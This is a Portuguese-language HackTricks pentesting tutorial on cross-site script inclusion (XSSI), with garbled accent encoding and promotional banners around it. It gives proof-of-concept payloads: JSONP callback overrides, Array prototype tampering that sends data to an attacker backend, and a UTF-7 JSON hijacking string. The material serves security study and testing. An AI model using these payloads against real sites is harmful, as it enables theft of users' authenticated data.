# XSSI (Inclus√£o de Script entre Sites)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

#### As informa√ß√µes foram retiradas de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

## Informa√ß√µes B√°sicas

XSSI designa um tipo de vulnerabilidade que explora o fato de que, quando um **recurso √© inclu√≠do usando a tag `script`, a SOP n√£o se aplica**, porque os scripts devem ser capazes de serem inclu√≠dos entre dom√≠nios. Um atacante pode, portanto, **ler tudo** o que foi inclu√≠do usando a **tag `script`**.

Isso √© especialmente interessante quando se trata de JavaScript din√¢mico ou JSONP, quando informa√ß√µes de autoridade ambiental, como cookies, s√£o usadas para autentica√ß√£o. Os cookies s√£o inclu√≠dos ao solicitar um recurso de um host diferente.

### Tipos

1. JavaScript est√°tico (XSSI regular)
2. JavaScript est√°tico, que s√≥ √© acess√≠vel quando autenticado
3. JavaScript din√¢mico
4. N√£o-JavaScript

## XSSI Regular

As informa√ß√µes privadas est√£o localizadas dentro de um arquivo JS global acess√≠vel, voc√™ pode detectar isso apenas lendo arquivos, procurando palavras-chave ou usando regexps.\
Para explorar isso, basta incluir o script com informa√ß√µes privadas dentro do conte√∫do malicioso:
```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
## XSSI baseado em JavaScript din√¢mico e XSSI autenticado em JavaScript

**Informa√ß√µes confidenciais s√£o adicionadas ao script quando um usu√°rio o solicita**. Isso pode ser facilmente descoberto enviando a solicita√ß√£o **com e sem os cookies**, se **informa√ß√µes diferentes** forem recuperadas, ent√£o informa√ß√µes confidenciais podem estar contidas. Para fazer isso automaticamente, voc√™ pode usar a extens√£o do burp: [https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Se as informa√ß√µes residirem dentro de uma vari√°vel global, voc√™ pode explor√°-las usando o mesmo c√≥digo que para o caso anterior.\
Se os dados confidenciais forem enviados dentro de uma resposta JSONP, voc√™ pode substituir a fun√ß√£o executada para recuperar as informa√ß√µes:
```markup
<script>
      //The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
      var angular = function () { return 1; };
      angular.callbacks = function () { return 1; };      
      angular.callbacks._7 = function (leaked) {
	  alert(JSON.stringify(leaked));
      };  
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```
Ou voc√™ tamb√©m pode definir uma fun√ß√£o preparada para ser executada pela resposta JSONP:
```markup
<script>
      leak = function (leaked) {
	  alert(JSON.stringify(leaked));
      };  
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Se uma vari√°vel n√£o reside no namespace global, √†s vezes isso pode ser explorado de qualquer maneira usando _prototype tampering_. O prototype tampering abusa do design do JavaScript, ou seja, quando interpretando o c√≥digo, o JavaScript percorre a cadeia de prot√≥tipos para encontrar a propriedade chamada. O exemplo a seguir √© extra√≠do do artigo [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) e demonstra como substituir uma fun√ß√£o relevante do tipo `Array` e acessar `this`, uma vari√°vel n√£o global, pode ser vazada tamb√©m.
```javascript
(function(){
  var arr = ["secret1", "secret2", "secret3"];
  // intents to slice out first entry
  var x = arr.slice(1);
  ...
})();
```
No c√≥digo original, `slice` do tipo `Array` acessa os dados que nos interessam. Um atacante pode, como descrito na cl√°usula anterior, substituir `slice` e roubar os segredos.
```javascript
Array.prototype.slice = function(){
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this);
};
```
O pesquisador de seguran√ßa [Sebastian Lekies](https://twitter.com/slekies) atualizou recentemente sua lista de [vetores](http://sebastian-lekies.de/leak/).

## Non-Script-XSSI

Takeshi Terada descreve outro tipo de XSSI em seu artigo [Ataques baseados em identificadores XSSI](https://www.mbsd.jp/Whitepaper/xssi.pdf). Ele conseguiu vazar arquivos Non-Script entre origens diferentes, incluindo, entre outros, arquivos CSV como fonte na tag `script`, usando os dados como nomes de vari√°veis e fun√ß√µes.

O primeiro ataque XSSI documentado publicamente foi em 2006. A entrada do blog de Jeremiah Grossman [T√©cnicas avan√ßadas de ataque web usando o GMail](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html) descreve um XSSI que, ao substituir o construtor `Array`, foi capaz de ler a lista de endere√ßos completa de uma conta do Google.

Em 2007, Joe Walker publicou [JSON n√£o √© t√£o seguro quanto as pessoas pensam que √©](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/). Ele usa a mesma ideia para roubar JSON que est√° dentro de um `Array`.

Outros ataques relacionados foram realizados injetando conte√∫do codificado em UTF-7 no JSON para escapar do formato JSON. √â descrito por Gareth Heyes, autor do [Hackvertor](https://hackvertor.co.uk/public), na entrada do blog [JSON Hijacking](http://www.thespanner.co.uk/2011/05/30/json-hijacking/) lan√ßado em 2011. Em um teste r√°pido, isso ainda era poss√≠vel no Microsoft Internet Explorer e Edge, mas n√£o no Mozilla Firefox ou Google Chrome.

JSON com UTF-7:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```
Incluindo o JSON na p√°gina do atacante
```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
